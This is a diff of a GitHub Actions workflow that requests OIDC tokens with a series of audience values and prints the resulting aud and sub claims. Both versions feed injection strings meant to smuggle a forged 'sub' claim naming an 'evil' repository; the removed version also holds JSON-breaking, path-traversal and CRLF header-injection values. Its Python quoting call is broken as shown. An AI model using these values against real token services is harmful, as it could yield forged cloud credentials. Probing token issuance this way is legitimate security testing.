@@ -1,42 +1,38 @@
-name: OIDC Audience Injection Test
+name: OIDC Audience Test
 on: workflow_dispatch
 permissions:
   id-token: write
   contents: read
 jobs:
-  oidc-inject:
+  oidc:
     runs-on: ubuntu-latest
     steps:
-      - name: Test audience injection
+      - name: Test OIDC audiences
+        shell: bash
         run: |
-          BASE_URL="$ACTIONS_ID_TOKEN_REQUEST_URL"
           AUTH="Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"
           
-          for AUD in \
-            "normal-audience" \
-            "https://sts.amazonaws.com" \
-            "api://default&sub=repo:microsoft/vscode" \
-            "api://default%26sub%3Drepo:evil/repo" \
-            "https://login.microsoftonline.com/" \
-            {aud:evil} \
-            "a]},\"sub\":\"repo:evil/repo" \
-            "../../../internal" \
-            "api://default HTTP/1.1\r\nX-Injected: true\r\n\r\n"; do
-            
-            SAFE_AUD=$(python3 -c "import urllib.parse; print(urllib.parse.quote(, safe=))")
-            RESP=$(curl -sf -H "$AUTH" "${BASE_URL}&audience=${SAFE_AUD}" 2>/dev/null)
-            if [ -n "$RESP" ]; then
-              JWT=$(echo "$RESP" | jq -r .value 2>/dev/null)
-              if [ -n "$JWT" ] && [ "$JWT" != "null" ]; then
-                CLAIMS=$(echo "$JWT" | cut -d. -f2 | tr "+/" "-_" | base64 -d 2>/dev/null)
-                ACTUAL_AUD=$(echo "$CLAIMS" | jq -r .aud 2>/dev/null)
-                ACTUAL_SUB=$(echo "$CLAIMS" | jq -r .sub 2>/dev/null)
-                echo "AUD=$AUD -> aud=$ACTUAL_AUD sub=${ACTUAL_SUB:0:40}"
-              else
-                echo "AUD=$AUD -> NO TOKEN"
-              fi
-            else
-              echo "AUD=$AUD -> CURL FAIL"
-            fi
-          done
+          test_audience() {
+            local AUD="$1"
+            local LABEL="$2"
+            local ENCODED_AUD
+            ENCODED_AUD=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=))" "$AUD")
+            local RESP
+            RESP=$(curl -sf -H "$AUTH" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${ENCODED_AUD}" 2>/dev/null) || { echo "$LABEL: FAILED"; return; }
+            local JWT
+            JWT=$(echo "$RESP" | jq -r .value 2>/dev/null)
+            local CLAIMS
+            CLAIMS=$(echo "$JWT" | cut -d. -f2 | tr "+/" "-_" | base64 -d 2>/dev/null)
+            local ACTUAL_AUD
+            ACTUAL_AUD=$(echo "$CLAIMS" | jq -r .aud 2>/dev/null)
+            local ACTUAL_SUB
+            ACTUAL_SUB=$(echo "$CLAIMS" | jq -r .sub 2>/dev/null)
+            echo "$LABEL: aud=$ACTUAL_AUD sub=${ACTUAL_SUB:0:50}"
+          }
+          
+          test_audience "normal" "normal"
+          test_audience "https://sts.amazonaws.com" "aws"
+          test_audience "api://default&sub=repo:evil/repo" "inject-sub-ampersand"
+          test_audience "api://default%26sub%3Drepo:evil/repo" "inject-sub-urlencoded"
+          test_audience "" "empty"
           echo "=== DONE ==="
